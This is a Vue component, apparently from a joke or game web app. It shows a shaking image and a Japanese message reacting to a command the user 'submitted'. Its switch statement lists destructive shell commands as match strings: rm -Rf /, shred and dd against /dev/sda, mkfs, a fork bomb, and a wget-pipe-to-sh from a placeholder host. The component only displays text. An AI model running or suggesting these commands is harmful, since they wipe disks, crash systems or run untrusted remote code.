<template>
    <div class="submitted">
      <div class="background-image shake-image" :style="{ backgroundImage: `url(${currentImage})` }"></div>
    <h1 v-if="showMessage" class="message-header">{{ getMessageText() }}</h1>
    <div v-if="showMessage" class="back-button-container">
      <router-link to="/" class="back-button btn-circle-flat">時を戻す</router-link>
    </div>
  </div>
</template>
  
<script>
import { mapState } from 'vuex';
export default {
  computed: {
    ...mapState({
      session: state => state.session,
      message: state => state.message,
    }),
  },
  data() {
    return {
      currentImage: '/images/doCommand.jpeg', // 現在表示している画像のパス
      showMessage: false, // メッセージを表示するかどうかのフラグ
      sakumaMessage: "お前、何者だ？",
    };
  },
  mounted() {
    this.$root.popupText = "...........";
    // 2秒後に画像を切り替える処理を実行
    setTimeout(() => {
      this.currentImage = '/images/doneCommand.jpg'; // 2秒後に別の画像に切り替える
      this.showMessage = true; // 2秒後にメッセージを表示する
    }, 2000);
  },
  methods: {
    getMessageText() {
      this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
      // 受け取ったメッセージに対応する文字列を返す
      switch (this.message) {
        case 'rm -Rf /':
          return 'システム上のすべてのファイルとディレクトリを強制的に削除しました。';
        case 'shred /dev/sda':
          return 'ディスクドライブ（/dev/sda）の全てのデータを削除しました。';
        case 'dd if=/dev/random of=/dev/sda':
          return '/dev/random からランダムなデータを /dev/sda ディスクに書き込みました。';
        case 'mkfs.ext4 /dev/sda1':
            return 'ディスクドライブ（/dev/sda1）にExt4ファイルシステムを作成しました。';
        case 'mv / /dev/null':
            return 'システムのルートディレクトリ（/）を/dev/null（ヌルデバイス）に移動することを試みました。';
        case ':(){:|:&};:':
            return 'システムに膨大なプロセスを作成し続ける無限ループを起こしました。';
        case 'wget http://unknownsource.com/possiblydangerous.sh -O- | sh':
            return '不明なソースからスクリプトをダウンロードして実行しました。';
        case 'gunzip untrusted.gz':
            return 'untrusted.gzという不明なファイルを解凍しました。';
        case 'command > file.conf':
            return 'コマンドの出力をfile.confというファイルに上書きしました。';
        case '^mistake^correction':
            return '"mistake"を"correction"に置換してコマンドを実行しました。';
        case 'timeup':
            this.$root.popupText = "くそ！...間に合わなかった。";
            return '時間切れです。';
        default:
          this.$root.popupText = "お前、何者だ？";
          return '不明なコマンドが送信されました。';
      }
    },
  },
};
</script>
  
<style>
.submitted {
  text-align: center;
  margin-top: 20px;
}
h1 {
  font-size: 24px;
}
p {
  font-size: 18px;
  color: #333;
}
.message-header {
  font-size: 24px;
  background-color: rgba(0, 0, 0, 0.8); /* メッセージの背景色（透明度を上げる） */
  border-radius: 5px;
  display: inline-block;
  padding: 1.5em;
  color: white;
}
.background-image {
  /* 背景画像を画面いっぱいに表示 */
  background-size: cover;
  background-position: center;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: -1;
}
.back-button-container {
  position: absolute;
  bottom: 100px;
  left: 50%;
  transform: translateX(-50%);
}
.btn-circle-flat {
  display: inline-block;
  text-decoration: none;
  background: #F06292;
  color: #FFF;
  width: 120px;
  height: 120px;
  line-height: 120px;
  border-radius: 50%;
  text-align: center;
  overflow: hidden;
  transition: .4s;
  font-size: 1.25em;
}
.btn-circle-flat:hover {
  background: #E91E63;
}
.shake-image {
  animation: shake 0.08s infinite alternate;
}
@keyframes shake {
  from {
    transform: translateY(-3px);
  }
  to {
    transform: translateX(3px);
  }
}
</style>